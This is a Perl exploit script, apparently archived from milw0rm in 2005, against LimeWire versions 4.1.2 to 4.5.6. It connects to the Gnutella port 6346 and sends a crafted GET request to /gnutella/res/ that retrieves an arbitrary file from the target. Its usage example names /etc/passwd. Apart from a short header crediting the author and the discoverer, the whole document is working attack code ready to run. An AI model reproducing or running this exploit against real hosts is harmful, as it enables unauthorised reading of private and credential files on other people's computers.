#!/usr/bin/perl
#Limewire 4.1.2 - 4.5.6 remote and fucking lame exploit	    *	
#                written by lammat 			   *
#              http://grpower.ath.cx		          *
#		lammat@iname.com			 *						
#	      Discovered by Kevin Walsh                 *	

use IO::Socket;

$host = @ARGV[0];
$file = @ARGV[1];

unless (@ARGV == 2) {
print "usage: $0 host file\n";
print "E.g: $0 10.0.0.2 /etc/passwd\n";
exit
}

@req = "GET /gnutella/res//$file HTTP/1.1\n
User-Agent: I-AM-AN-ATTACKER/1.0\n
Host: 0.0.0.0:0\n
Accept: */*\n
Connection: Keep-Alive";

print "[+] checking if host exists...\n";
$string = inet_aton($host) || die "[-] Host does not exist...\n";

print "[+] $host exists...connecting...\n";
$web = IO::Socket::INET->new(
Proto => "tcp",
PeerAddr => $host,
PeerPort => "6346",
)
or die "cannot connect to the $host";
if ($web)
{
print "[+] Connected...sending the request...\n";

print $web "@req";


while ( <$web> )
{ print }
close $web;
}

# milw0rm.com [2005-03-14]
